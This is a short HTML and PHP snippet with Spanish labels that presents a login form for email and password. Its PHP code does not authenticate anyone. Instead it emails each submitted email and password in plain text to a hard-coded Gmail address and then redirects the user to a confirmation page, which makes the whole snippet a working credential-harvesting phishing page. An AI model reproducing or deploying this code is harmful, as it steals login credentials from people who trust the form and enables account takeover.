<form action="login.php" method="POST">
    <input type="email" class="form-control" placeholder="Correo electrónico" name="email">
    <input type="password" class="form-control" placeholder="Contraseña" name="password">
    <button class="btn">Iniciar sesión</button>
</form>
<?php
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // Configuración del servidor de correo
    $to = 'Jessie1Zahori@gmail.com';
    $subject = 'Contraseña ingresada';
    $message = "Correo electrónico: $email\nContraseña: $password";
    $headers = 'From: Jessie1Zahori@gmail.com';
    
    // Envío del correo electrónico
    mail($to, $subject, $message, $headers);
    
    // Redirige al usuario a una página de confirmación
    header('Location: confirmacion.html');
?>